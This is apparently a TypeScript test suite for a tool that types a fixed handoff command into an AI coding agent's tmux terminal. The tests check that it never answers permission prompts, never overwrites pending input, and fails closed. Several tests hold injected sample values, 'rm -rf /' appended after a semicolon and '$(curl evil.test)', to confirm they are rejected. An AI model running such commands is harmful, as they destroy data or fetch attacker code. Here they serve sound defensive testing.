import assert from "node:assert/strict";
import { afterEach, test } from "node:test";
import { classifyCommand, findControllingTty } from "../src/terminal/discover.js";
import { TerminalTyper, awaitingAnswer, typedInput } from "../src/terminal/inject.js";
import { HANDOFF_COMMAND, assertHandoffCommand } from "../src/terminal/payload.js";
import type { DriverName, TerminalDriver } from "../src/terminal/types.js";

class FakeDriver implements TerminalDriver {
  readonly name: DriverName = "tmux";
  writes: string[] = [];
  enters = 0;
  captureError: Error | null = null;

  constructor(private screens: string[]) {}

  async capture(): Promise<string> {
    if (this.captureError) throw this.captureError;
    return this.screens.length > 1 ? (this.screens.shift() as string) : this.screens[0];
  }

  async sendText(text: string): Promise<void> {
    this.writes.push(text);
  }

  async sendEnter(): Promise<void> {
    this.enters += 1;
  }
}

function typerWith(driver: TerminalDriver | null, reason?: string, fix?: string): TerminalTyper {
  const typer = new TerminalTyper(() => {}, 1200);
  Object.assign(typer, { detection: { driver, reason, fix } });
  return typer;
}

const IDLE = "> \n";
const PERMISSION_PROMPT = `Do you want to make this edit?
❯ 1. Yes
  2. No, and tell Claude what to do differently`;

const env = { ...process.env };
afterEach(() => {
  process.env = { ...env };
});

test("findControllingTty walks past the detached server to the agent's terminal", async () => {
  const tty = await findControllingTty();
  assert.ok(tty === null || /^\/dev\/\w+/.test(tty), `unexpected tty ${tty}`);
});

test("a settled screen gets the fixed line and a separate Enter", async () => {
  const driver = new FakeDriver([IDLE]);
  const result = await typerWith(driver).type();
  assert.deepEqual(result, { typed: true });
  assert.deepEqual(driver.writes, [HANDOFF_COMMAND]);
  assert.equal(driver.enters, 1);
});

test("only the fixed handoff line can be typed", () => {
  assert.ok(!/\n|\r/.test(HANDOFF_COMMAND));
  assert.ok(HANDOFF_COMMAND.includes("list_comments"));
  assert.doesNotThrow(() => assertHandoffCommand(HANDOFF_COMMAND));
  assert.throws(() => assertHandoffCommand(`${HANDOFF_COMMAND}; rm -rf /`), /fixed Northstar/);
  assert.throws(() => assertHandoffCommand("$(curl evil.test)"), /fixed Northstar/);
});

test("agents are told apart by their command line", () => {
  assert.equal(
    classifyCommand("claude --dangerously-load-development-channels server:northstar"),
    "claude-code",
  );
  assert.equal(classifyCommand("node /opt/homebrew/bin/codex exec"), "codex");
  assert.equal(
    classifyCommand("node /usr/lib/node_modules/@google/gemini-cli/dist/index.js"),
    "gemini",
  );
  assert.equal(classifyCommand("/bin/zsh -c eval 'claude --print'"), "other");
  assert.equal(classifyCommand("vim claude.md"), "other");
});

test("a pending choice prompt is never answered", async () => {
  const driver = new FakeDriver([PERMISSION_PROMPT]);
  const result = await typerWith(driver).type();
  assert.equal(result.typed, false);
  assert.equal(result.typed === false && /waiting on a prompt/.test(result.reason), true);
  assert.equal(driver.writes.length, 0);
  assert.equal(driver.enters, 0);
});

test("a yes/no confirmation is never answered", async () => {
  const driver = new FakeDriver(["Overwrite the file? (y/n)"]);
  const result = await typerWith(driver).type();
  assert.equal(result.typed, false);
  assert.equal(driver.enters, 0);
});

test("output still moving is waited out, then typed", async () => {
  const driver = new FakeDriver(["building...", "building... done", IDLE]);
  const result = await typerWith(driver).type();
  assert.equal(result.typed, true);
  assert.deepEqual(driver.writes, [HANDOFF_COMMAND]);
});

test("a driver that cannot be read fails closed", async () => {
  const driver = new FakeDriver([IDLE]);
  driver.captureError = new Error("osascript denied");
  const result = await typerWith(driver).type();
  assert.equal(result.typed, false);
  assert.equal(result.typed === false && /osascript denied/.test(result.reason), true);
  assert.equal(driver.writes.length, 0);
});

test("no detected terminal reports the reason and the fix instead of throwing", async () => {
  const result = await typerWith(null, "no terminal", "use tmux").type();
  assert.deepEqual(result, { typed: false, reason: "no terminal", fix: "use tmux" });
});

test("check reports a readable session and a broken one", async () => {
  assert.deepEqual(await typerWith(new FakeDriver([IDLE])).check(), { ok: true, driver: "tmux" });
  const broken = new FakeDriver([IDLE]);
  broken.captureError = new Error("no pane");
  const check = await typerWith(broken).check();
  assert.equal(check.ok, false);
  assert.equal(!check.ok && /no pane/.test(check.reason), true);
  const none = await typerWith(null, "nope", "fix it").check();
  assert.deepEqual(none, { ok: false, reason: "nope", fix: "fix it" });
});

test("every send types at most once and never retries", async () => {
  const driver = new FakeDriver([IDLE]);
  const typer = typerWith(driver);
  await typer.type();
  await typer.type();
  assert.equal(driver.writes.length, 2);
  assert.equal(driver.enters, 2);
});

const lines = (screen: string) => screen.split("\n").filter(Boolean);

test("text already in the agent input is never typed over", async () => {
  const driver = new FakeDriver(["> fix the hero spac\n"]);
  const result = await typerWith(driver).type();
  assert.equal(result.typed, false);
  assert.equal(result.typed === false && /text in the agent input/.test(result.reason), true);
  assert.equal(driver.writes.length, 0);
  assert.equal(driver.enters, 0);
});

test("a boxed empty input and a placeholder count as empty", () => {
  assert.equal(typedInput(lines("╭──╮\n│ >   │\n╰──╯\n  ? for shortcuts")), "");
  assert.equal(typedInput(lines('│ > Try "fix lint errors" │')), "");
  assert.equal(typedInput(lines("│ > half a sentence │")), "half a sentence");
  assert.equal(typedInput(lines("just output")), null);
});

test("only the last line decides a confirm prompt and a stale choice list is ignored", () => {
  assert.equal(awaitingAnswer(lines("Overwrite? (y/n)\nthen more output")), false);
  assert.equal(awaitingAnswer(lines("Overwrite? (y/n)")), true);
  assert.equal(awaitingAnswer(lines("❯ 1. old option\n  2. other\nDone, all green")), false);
  assert.equal(awaitingAnswer(lines("Pick one\n❯ 1. Yes\n  2. No")), true);
  assert.equal(awaitingAnswer(lines("  1. just a numbered list\n  2. in the output")), false);
});

test("a definitive detection answer is cached", async () => {
  const typer = new TerminalTyper(() => {}, 1200);
  process.env.NORTHSTAR_TERMINAL = "none";
  assert.equal((await typer.check()).ok, false);
  process.env.NORTHSTAR_TERMINAL = "tmux";
  process.env.TMUX_PANE = "%1";
  const check = await typer.check();
  assert.equal(check.ok, false);
  assert.equal(!check.ok && /NORTHSTAR_TERMINAL=none/.test(check.reason), true);
});

test("a malformed pane id never reaches a command", async () => {
  process.env.NORTHSTAR_TERMINAL = "tmux";
  process.env.TMUX_PANE = "%1; rm -rf /";
  const check = await new TerminalTyper(() => {}, 1200).check();
  assert.equal(check.ok, false);
  assert.equal(!check.ok && /not a pane id/.test(check.reason), true);
});
